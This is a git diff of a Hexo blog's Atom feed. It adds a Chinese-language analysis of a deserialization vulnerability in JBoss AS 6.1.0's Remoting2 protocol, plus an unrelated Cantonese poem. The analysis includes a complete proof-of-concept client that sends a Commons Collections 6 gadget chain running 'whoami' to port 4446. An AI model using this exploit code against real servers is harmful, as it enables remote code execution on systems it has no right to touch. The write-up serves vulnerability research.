@@ -3,11 +3,11 @@
   <title>P1ay2win&#39;s blog</title>
   
   <subtitle>他们的爱与风华，只问自由，只问深情，只问盛放，只问初心，只问勇敢，无问西东。</subtitle>
-  <link href="https://blog.play2win.top/atom.xml" rel="self"/>
+  <link href="http://127.0.0.1/atom.xml" rel="self"/>
   
-  <link href="https://blog.play2win.top/"/>
-  <updated>2022-03-22T15:55:55.586Z</updated>
-  <id>https://blog.play2win.top/</id>
+  <link href="http://127.0.0.1/"/>
+  <updated>2022-06-02T03:31:01.047Z</updated>
+  <id>http://127.0.0.1/</id>
   
   <author>
     <name>P1ay2win</name>
@@ -17,9 +17,56 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>JBoss remoting2协议及其反序列化分析</title>
+    <link href="http://127.0.0.1/2022/06/02/JBoss%20remoting2%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
+    <id>http://127.0.0.1/2022/06/02/JBoss%20remoting2%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</id>
+    <published>2022-06-02T03:30:53.000Z</published>
+    <updated>2022-06-02T03:31:01.047Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间读了<a href="https://twitter.com/y4er_chabug" target="_blank" rel="noopener">@Y4ar</a>师傅分析JBoss的文章和《A little bit beyong \xAC\xED》的原文，起初简单的看下，以为是普通的反序列漏洞，后面经过分析才察觉是关于JBoss的<strong>Remoting2协议</strong>的漏洞。本文以JBoss AS 6.1.0.Final为例，主要分析与<a href="https://twitter.com/y4er_chabug" target="_blank" rel="noopener">@Y4ar</a>师傅稍有不同的一种反序列化触发方式。</p><a id="more"></a><h2 id="Remoting2协议"><a href="#Remoting2协议" class="headerlink" title="Remoting2协议"></a>Remoting2协议</h2><p>Remoting服务端的框架如下图所示，在接受收到从网络传输过来的数据后，数据会由<code>UnMarshaller</code>转换调用请求对象，传送到<code>ServerInvoker</code>，再由其根据调用请求对象的信息传送到相应的调用实现类<code>InvocationHandler</code>。</p><p><code>InvocationHandler</code>执行完的返回结果，会经由<code>ServerInvoker</code>传到<code>Marshaller</code>，再由<code>Marshaller</code>转换为网络中传输的数据，传回给调用的客户端。</p><p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/design_server.jpg" alt></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>从粗略浏览文章获取到的信息来看，漏洞存在于3873和4446端口。那么直接下断点在<code>ServerSocket</code>，往前回溯几层，可以看到分别是由<code>org.jboss.remoting.transport.Connector#start</code>方法和<code>org.jboss.remoting.transport.socket.SocketServerInvoker#start</code>开启的监听端口。在<code>SocketServerInvoker</code>对象中的<code>props</code>属性可以看到自定义的编码、解码工具类：<code>InvocationMarshaller</code>和<code>InvocationUnMarshaller</code>。</p><p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/屏幕截图 2022-05-24 190456.png" alt="屏幕截图 2022-05-24 190456"></p><p>在后端框架中<code>Connector</code>充当着管理<code>ServerInvoker</code>的角色，并为<code>ServerInvoker</code>添加<code>InvocationHandler</code>，其<code>addInvocationHandler</code>就是用来实现该功能的。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> ServerInvocationHandler <span class="hljs-title">addInvocationHandler</span><span class="hljs-params">(String subsystem, <span class="hljs-keyword">final</span> ServerInvocationHandler handler)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.invoker == <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(<span class="hljs-string">"You may only add handlers once the Connector is created (via create() method)."</span>);</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        AccessController.doPrivileged(<span class="hljs-keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">            <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">                handler.setMBeanServer(Connector.<span class="hljs-keyword">this</span>.server);</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.invoker.addInvocationHandler(subsystem, handler);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用于供Remotoing客户端调用的<code>ServerInvocationHandler</code>实现类众多，包括各种各样协议和使用场景。</p><p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/屏幕截图 2022-05-24 193836.png" alt></p><p>基于<code>Connector</code>的功能，我们在其<code>addInvocationHandler</code>方法处下断点，可以得出JBoss所使用到的<code>InvocationHandler</code>。在默认配置下，实测只会使用到以下五个<code>ServerInvocationHandler</code>。其中<code>AOPRemotingInvocationHandler</code>类配置在3873端口，其余四个配置在4446端口。</p><ul><li>org.jboss.profileservice.remoting.ProfileServiceInvocationHandler</li><li>org.jboss.aspects.remoting.AOPRemotingInvocationHandler</li><li>org.jboss.profileservice.management.upload.remoting.DeployHandler</li><li>org.jboss.invocation.unified.server.UnifiedInvoker</li><li>org.jboss.deployment.remoting.DeployHandler</li></ul><p>从网上找到一个客户端的Demo代码，没有设置<code>subsystem</code>名称，默认就进到了4446端口下的第一个<code>InvocationHandler</code>。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> java.net.MalformedURLException;  </span><br><span class="line"><span class="hljs-keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="hljs-keyword">import</span> org.jboss.remoting.Client;  </span><br><span class="line"><span class="hljs-keyword">import</span> org.jboss.remoting.InvokerLocator;  </span><br><span class="line">  </span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClientTest</span> </span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;  </span><br><span class="line">        String locatorURI = <span class="hljs-string">"socket://192.168.78.132:4446"</span>;  </span><br><span class="line">        String params = <span class="hljs-string">"/?backlog=50&amp;numAcceptThreads=30&amp;maxPoolSize=30&amp;clientMaxPoolSize=30&amp;clientLeasePeriod=10000&amp;timeout=8000"</span>;  </span><br><span class="line">        locatorURI += params;  </span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;  </span><br><span class="line">            InvokerLocator locator = <span class="hljs-keyword">new</span> InvokerLocator(locatorURI);  </span><br><span class="line">            Client client = <span class="hljs-keyword">new</span> Client(locator,ServerHandle.class.getName());  </span><br><span class="line">            client.connect();  </span><br><span class="line">            client.invoke(<span class="hljs-string">"jhb "</span>,<span class="hljs-keyword">new</span> HashMap&lt;String,String&gt;());  </span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (MalformedURLException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进到<code>org.jboss.deployment.remoting.DeployHandler#invoke</code>方法，其逻辑是从<code>InvocationRequest</code>获取参数和载荷，再根据参数值调用相应的方法。其中参数的值就是客户端中调用<code>invoke</code>方法传的值。</p><p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/屏幕截图 2022-05-24 204600.png" alt></p><p>来到<code>InvocationRequest</code>的定义处，它实现了<code>Serializable</code>，并且<code>getParameter</code>和<code>getRequestPayload</code>方法获取到的属性的类型分别为<code>Object</code>和<code>Map</code>。</p><p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/屏幕截图 2022-05-30 151243.png" alt></p><p>这里直接在调用<code>Client</code>的<code>invoke</code>方法时，<code>param</code>或<code>matedata</code>参数传入CC6的对象，即可触发反序列化漏洞。在调用栈中从自定义的解码工具类<code>InvocationUnMarshaller</code>开始，中间没有反序列化类黑白名单等防护措施，一路来到<code>ObjectInputStream</code>的<code>readObject</code>方法反序列化还原CC6对象。</p><p><img src="/2022/06/02/JBoss remoting2协议及其反序列化分析/屏幕截图 2022-05-30 153557.png" alt></p><p>另一个存在漏洞的端口3873，调用栈中反序列化是从<code>SerializableUnMatshaller</code>开始，但最终过程是一样的。</p><p>最终完整POC如下：</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SimpleClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        makeInvocation(<span class="hljs-string">"socket://192.168.78.155:4446/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">makeInvocation</span><span class="hljs-params">(String locatorURI)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        InvokerLocator locator = <span class="hljs-keyword">new</span> InvokerLocator(locatorURI);</span><br><span class="line">        System.out.println(<span class="hljs-string">"Calling remoting server with locator uri of: "</span> + locatorURI);</span><br><span class="line"></span><br><span class="line">        Client remotingClient = <span class="hljs-keyword">new</span> Client(locator);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String,Object&gt; mateMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        mateMap.put(<span class="hljs-string">"test"</span>,ApacheCommonsCollections6.getObject());</span><br><span class="line">        remotingClient.connect();</span><br><span class="line">        remotingClient.invoke(mateMap);</span><br><span class="line">        remotingClient.invoke(<span class="hljs-string">"jhb "</span>,mateMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApacheCommonsCollections6</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] realChain = <span class="hljs-keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"getMethod"</span>, <span class="hljs-keyword">new</span> Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;</span><br><span class="line">                        <span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"invoke"</span>, <span class="hljs-keyword">new</span> Class[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;</span><br><span class="line">                        <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"exec"</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">"whoami"</span>&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="hljs-keyword">new</span> ChainedTransformer(realChain);</span><br><span class="line">        Map innermap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        Map outermap = LazyMap.decorate(innermap, chain);</span><br><span class="line">        TiedMapEntry tme = <span class="hljs-keyword">new</span> TiedMapEntry(outermap, <span class="hljs-string">"mykey"</span>);</span><br><span class="line">        HashSet hs = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);</span><br><span class="line">        hs.add(<span class="hljs-string">"diggid"</span>);</span><br><span class="line">        Field mapField = Class.forName(<span class="hljs-string">"java.util.HashSet"</span>).getDeclaredField(<span class="hljs-string">"map"</span>);</span><br><span class="line">        mapField.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        HashMap hm = (HashMap) mapField.get(hs);</span><br><span class="line">        Field tableField = Class.forName(<span class="hljs-string">"java.util.HashMap"</span>).getDeclaredField(<span class="hljs-string">"table"</span>);</span><br><span class="line">        tableField.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        Object[] tableArray = (Object[]) tableField.get(hm);</span><br><span class="line">        Object table = tableArray[<span class="hljs-number">0</span>];</span><br><span class="line">        Field key = table.getClass().getDeclaredField(<span class="hljs-string">"key"</span>);</span><br><span class="line">        key.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        key.set(table, tme);</span><br><span class="line">        <span class="hljs-keyword">return</span> hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="随便看看"><a href="#随便看看" class="headerlink" title="随便看看"></a>随便看看</h2><p>前面有说到remoting2除了socket外，还支持其他一些协议，但默认模式下基于socket协议的remoting2协议被用到。不过其中的<code>WebInvoctonHandler</code>还是挺吸引人的。看了JBoss的文档，发现有关于这个InvocationHandler的介绍，它可以通过http协议进行反序列化。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SimpleClient</span> </span>&#123;</span><br><span class="line">    <span class="hljs-comment">// Default locator values</span></span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String transport = <span class="hljs-string">"http"</span>;</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String host = <span class="hljs-string">"localhost"</span>;</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> port = <span class="hljs-number">5400</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">makeInvocation</span><span class="hljs-params">(String locatorURI)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="hljs-comment">// create InvokerLocator with the url type string</span></span><br><span class="line">        <span class="hljs-comment">// indicating the target remoting server to call upon.</span></span><br><span class="line">        InvokerLocator locator = <span class="hljs-keyword">new</span> InvokerLocator(locatorURI);</span><br><span class="line">        System.out.println(<span class="hljs-string">"Calling remoting server with locator uri of: "</span> + locatorURI);</span><br><span class="line"></span><br><span class="line">        Client remotingClient = <span class="hljs-keyword">new</span> Client(locator);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// make invocation on remoting server and send complex data object</span></span><br><span class="line">        <span class="hljs-comment">// by default, the remoting http client invoker will use method type of POST,</span></span><br><span class="line">        <span class="hljs-comment">// which is needed when ever sending objects to the server.  So no metadata map needs</span></span><br><span class="line">        <span class="hljs-comment">// to be passed to the invoke() method.</span></span><br><span class="line">        Object response = remotingClient.invoke(<span class="hljs-keyword">new</span> ComplexObject(<span class="hljs-number">2</span>, <span class="hljs-string">"foo"</span>, <span class="hljs-keyword">true</span>), <span class="hljs-keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="hljs-string">"\nResponse from remoting http server when making http POST request and sending a complex data object:\n"</span> + response);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map metadata = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        <span class="hljs-comment">// set the metadata so remoting client knows to use http GET method type</span></span><br><span class="line">        metadata.put(<span class="hljs-string">"TYPE"</span>, <span class="hljs-string">"GET"</span>);</span><br><span class="line">        <span class="hljs-comment">// not actually sending any data to the remoting server, just want to get its response</span></span><br><span class="line">        response = remotingClient.invoke((Object) <span class="hljs-keyword">null</span>, metadata);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="hljs-string">"\nResponse from remoting http server when making GET request:\n"</span> + response);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// now set type back to POST and send a plain text based request</span></span><br><span class="line">        metadata.put(<span class="hljs-string">"TYPE"</span>, <span class="hljs-string">"POST"</span>);</span><br><span class="line">        response = remotingClient.invoke(WebInvocationHandler.STRING_RETURN_PARAM, metadata);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="hljs-string">"\nResponse from remoting http server when making http POST request and sending a text based request:\n"</span> + response);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// notice are getting custom response code and message set by web invocation handler</span></span><br><span class="line">        Integer responseCode = (Integer) metadata.get(HTTPMetadataConstants.RESPONSE_CODE);</span><br><span class="line">        String responseMessage = (String) metadata.get(HTTPMetadataConstants.RESPONSE_CODE_MESSAGE);</span><br><span class="line">        System.out.println(<span class="hljs-string">"Response code from server: "</span> + responseCode);</span><br><span class="line">        System.out.println(<span class="hljs-string">"Response message from server: "</span> + responseMessage);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然在JBoss这里用到<code>WebInvoctonHandler</code>，但是根据JBoss的Demo配置文件给出的路径<code>/servlet-invoker/ServerInvokerServlet</code>，可以查到基于JBoss开发的JBoss Operations Network存在关于<code>WebInvoctonHandler</code>的漏洞，CVE编号为CVE-2016-3737。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看了JBoss其他反序列化漏洞、4446和3873这两个端口漏洞，感觉JBoss就像个筛子，特别是Remoting这个协议。后面在JBoss EAP 6.x和JBoss/Wildfly AS 7.x及往后版本，JBoss/Wildfly已默认不使用remoting2协议，而是使用了引入身份认证机制的remoting3协议。感觉remoting3协议可分析看看也没有什么漏洞，但最坑的是这么多年过去了，remoting3竟然连份文档都没有。。。</p><p>文中若有什么错误的地方，恳请各位师傅斧正。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://docs.jboss.org/jbossremoting/2.5.4.SP5/guide/html_single/" target="_blank" rel="noopener">https://docs.jboss.org/jbossremoting/2.5.4.SP5/guide/html_single/</a></p><p><a href="https://docs.jboss.org/jbossremoting/2.5.4.SP5/userguide/html_single/" target="_blank" rel="noopener">https://docs.jboss.org/jbossremoting/2.5.4.SP5/userguide/html_single/</a></p><p><a href="https://y4er.com/post/jboss-4446-rce-and-rpc-echo-response/" target="_blank" rel="noopener">https://y4er.com/post/jboss-4446-rce-and-rpc-echo-response/</a></p><p><a href="https://www.tenable.com/security/research/tra-2016-22" target="_blank" rel="noopener">https://www.tenable.com/security/research/tra-2016-22</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前段时间读了&lt;a href=&quot;https://twitter.com/y4er_chabug&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;@Y4ar&lt;/a&gt;师傅分析JBoss的文章和《A little bit beyong \xAC\xED》的原文，起初简单的看下，以为是普通的反序列漏洞，后面经过分析才察觉是关于JBoss的&lt;strong&gt;Remoting2协议&lt;/strong&gt;的漏洞。本文以JBoss AS 6.1.0.Final为例，主要分析与&lt;a href=&quot;https://twitter.com/y4er_chabug&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;@Y4ar&lt;/a&gt;师傅稍有不同的一种反序列化触发方式。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
+    
+    
+    <category term="反序列化" scheme="http://127.0.0.1/tags/反序列化/"/>
+    
+    <category term="JBoss" scheme="http://127.0.0.1/tags/JBoss/"/>
+    
+    <category term="remoting" scheme="http://127.0.0.1/tags/remoting/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>惊回晓梦忆秋娟</title>
+    <link href="http://127.0.0.1/2022/04/25/%E6%83%8A%E5%9B%9E%E6%99%93%E6%A2%A6%E5%BF%86%E7%A7%8B%E5%A8%9F/"/>
+    <id>http://127.0.0.1/2022/04/25/%E6%83%8A%E5%9B%9E%E6%99%93%E6%A2%A6%E5%BF%86%E7%A7%8B%E5%A8%9F/</id>
+    <published>2022-04-25T14:10:53.000Z</published>
+    <updated>2022-06-02T03:51:59.652Z</updated>
+    
+    <content type="html"><![CDATA[<p>惊回晓梦，鹤唳声声，又声声寒角吹遍江城，隔岸蒹葭人寂静，废池乔木也厌言兵，昨夜醉乡难酩酊，今朝歧路未分明，樊川落魄悲同命，情到深时一死轻，重还有 约但系期无定，又怕赢得青楼薄幸名，辗转思量心自省，都系文章负我我负卿卿，估话钟鼎山林虽则皆幻影，有个风尘知已不负我生平，怎想两月绸缪如画饼，只换得一船离恨独对数峰青，正系素愿空留明珠侍聘，柔丝自缚慧剑无灵，韶华如梦终须认，争教红泪不成冰，你愿化蝶相寻但系谁为引领，你都未知何处我又要登程。</p><p>征途昼永，我又倚蓬搵，你睇荒村黄叶又近重阳，记得去年今日尚作非非想，想话神仙唔愿愿做鸳鸯，水暖春江同荡漾，不管人间离合世态炎凉，只要患难相扶欢愉共享，生时成对死亦成双，我话系前世姻缘你话系冤孽账，只怨奴奴生错一副软心肠，怕我太过多情会容易别向，遇着浮花浪蕊又话怜香，我愿忏悔往日疏狂重求你 见谅，你种真情真义令我没齿也难忘，只望青云有路人无恙，有日荣归衣锦报答红妆，个阵翠绕珠围不复当年个样，枝头飞上等你气吐名扬，今日相守都唔未能重存乜野奢望，我亦寒枝拣尽鬓染秋霜，但愿名花有主早日除魔障，愿你早日除魔障，更愿交还恩爱去礼空王。</p><p>飘零去，你都莫问前因，只见半山残照一个愁人，去路茫茫不禁悲来阵阵，前尘惘惘惹我泪落纷纷，仍是念念不忘心相印，尚有几回肠断几度销云，本想学投笔从戎图发奋，却被儒冠误了我有志难伸，想学一棹五湖同遁隐，却被妖纷笼遍远无垠，想学飞蛾破茧不复情丝困，却被一灯红焰又焚身，正系了得相思难了恨，梦来何处更为云，重讲乜石烂海枯情不泯，就算重逢有日已是负义忘恩，今日倚楼人远天涯近，呢件青衫曾染我地话别啼痕，襟前有两瓣系你唇脂晕，几度雨淋日晒而家都认唔真，你睇沉沉暮霭西风紧，南飞北雁怕向客中闻，平安未报自问心何忍，空余泪眼望断黄昏，又听得疏钟几杵好似来相引，引我都菩提树下莫恋红尘，草际秋虫声渐哽，只见隔林一点佛前灯，佛相庄严灯又暗，愧我殉情割爱两无能，虽则我佛慈悲都系难恕薄幸，甘为羁旅了却残生，世间何物堪酬赠，心耿耿，从此飘萍和断梗，能许深情默约句句都无凭。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;惊回晓梦，鹤唳声声，又声声寒角吹遍江城，隔岸蒹葭人寂静，废池乔木也厌言兵，昨夜醉乡难酩酊，今朝歧路未分明，樊川落魄悲同命，情到深时一死轻，重还有 约但系期无定，又怕赢得青楼薄幸名，辗转思量心自省，都系文章负我我负卿卿，估话钟鼎山林虽则皆幻影，有个风尘知已不负我生平，怎想两月</summary>
+      
+    
+    
+    
+    <category term="日常" scheme="http://127.0.0.1/categories/日常/"/>
+    
+    
+  </entry>
+  
+  <entry>
     <title>JVM Shellcode注入探索</title>
-    <link href="https://blog.play2win.top/2022/03/22/JVM_Shellcode%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%B4%A2/"/>
-    <id>https://blog.play2win.top/2022/03/22/JVM_Shellcode%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%B4%A2/</id>
+    <link href="http://127.0.0.1/2022/03/22/JVM_Shellcode%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%B4%A2/"/>
+    <id>http://127.0.0.1/2022/03/22/JVM_Shellcode%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%B4%A2/</id>
     <published>2022-03-22T14:25:53.000Z</published>
     <updated>2022-03-22T15:55:55.586Z</updated>
     
@@ -30,21 +77,21 @@
     
     
     
-    <category term="代码审计" scheme="https://blog.play2win.top/categories/代码审计/"/>
+    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
     
     
-    <category term="JVM" scheme="https://blog.play2win.top/tags/JVM/"/>
+    <category term="JVM" scheme="http://127.0.0.1/tags/JVM/"/>
     
-    <category term="HotSpot" scheme="https://blog.play2win.top/tags/HotSpot/"/>
+    <category term="HotSpot" scheme="http://127.0.0.1/tags/HotSpot/"/>
     
-    <category term="shellcode" scheme="https://blog.play2win.top/tags/shellcode/"/>
+    <category term="shellcode" scheme="http://127.0.0.1/tags/shellcode/"/>
     
   </entry>
   
   <entry>
     <title>Java RMI攻击分析与总结</title>
-    <link href="https://blog.play2win.top/2022/02/16/Java_RMI%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/"/>
-    <id>https://blog.play2win.top/2022/02/16/Java_RMI%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/</id>
+    <link href="http://127.0.0.1/2022/02/16/Java_RMI%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/"/>
